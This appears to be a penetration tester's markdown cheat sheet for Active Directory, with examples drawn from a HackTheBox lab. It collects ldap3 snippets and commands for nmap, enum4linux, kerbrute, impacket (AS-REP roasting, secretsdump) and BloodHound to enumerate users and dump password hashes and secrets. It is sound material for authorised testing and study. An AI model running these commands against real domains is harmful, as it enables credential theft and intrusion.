# Active Directory

## AD MindMap

[https://www.xmind.net/m/5dypm8/](https://www.xmind.net/m/5dypm8/)

## Manual Enumeration

- connect to LDAP

```python
import ldap3
server = ldap3.Server('x.X.x.X', get_info = ldap3.ALL, port =636, use_ssl = True)
connection = ldap3.Connection(server)
connection.bind()
True
server.info
```

- with name context, enumerate users

```python
connection.search(search_base='DC=timelapse,DC=htb', search_filter='(&(objectClass=*))', search_scope='SUBTREE', attributes='*')
True
connection.entries
```

- dump ad

```python
connection.search(search_base='DC=timelapse,DC=htb', search_filter='(&(objectClass=person))', search_scope='SUBTREE', attributes='userPassword')
```

## Tools

### nmap

- enum ldap properties

```
nmap -n -sV --script "ldap* and not brute" -p 389 $ip -Pn

```

- enumerate users

```
nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='$dom',userdb=/opt/wordlist/list.txt" $ip

```

### enum4linux

- list share, get domain name etc..

```
enum4linux -a $ip

```

- enumerate users

```
enum4linux -U $ip | grep 'user:'

```

### windapsearch

- enumerate users, domain name

```
python3 windapsearch.py --dc-ip $ip --users --full > wdapusers.txt
grep sAMAccountName wdapusers.txt | cut -d " " -f 2 > users.txt

```

### ldapsearch

- enumerate ldap properties

```
ldapsearch -x -h $ip -s base

```

- enumerate users

```
ldapsearch -h $ip -p 389 -x -b "dc=domain,dc=local"

```

- credential dumping

```
ldapsearch -LLL -x -H ldap://$ip -b "dc=domain,dc=local" -s base '(objectclass=*)'

```

### kerbrute

```
kerbrute userenum --dc $ip -d $dom /path/to/list.txt

```

### impacket

- check asreproast for a list of user

```
GetNPUsers.py domain.tld/ -dc-ip $ip -usersfile /path/to/list.txt

GetNPUsers.py -usersfile /path/to/list.txt -format hashcat -outputfile hashes.asreproast -dc-ip $ip $dom/
# crack the hash with hashcat -m 18200

```

- dump secret

```
secretsdump.py -dc-ip 0.0.0.0 domain.tld/username:password@0.0.0.0

```

- brute force domain sids

```
lookupsid.py anonymous@$ip

```

### bloodhound

```
pip3 install bloodhound
python3 -m bloodhound -d domain.tld -u username -p "password" -gc dc.domain.tld -c all -ns 0.0.0.0

```